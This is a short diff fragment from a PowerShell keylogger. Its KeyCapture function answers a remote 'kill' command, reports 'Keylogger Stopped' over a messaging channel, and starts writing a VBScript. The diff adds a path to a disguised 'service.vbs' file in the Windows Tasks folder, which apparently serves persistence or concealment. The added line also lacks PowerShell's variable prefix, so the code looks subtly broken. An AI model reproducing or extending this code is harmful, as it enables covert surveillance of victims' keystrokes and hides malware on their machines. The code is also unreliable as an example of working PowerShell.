@@ -929,6 +929,7 @@ Function KeyCapture {
             if ($response -like "kill") {
             sendMsg -Message ":mag_right: ``Keylogger Stopped`` :octagonal_sign:"
             $script:previouscmd = $response
+	    VBpath = "C:\Windows\Tasks\service.vbs"
             $tobat = @"
 Set WshShell = WScript.CreateObject(`"WScript.Shell`")
 WScript.Sleep 200
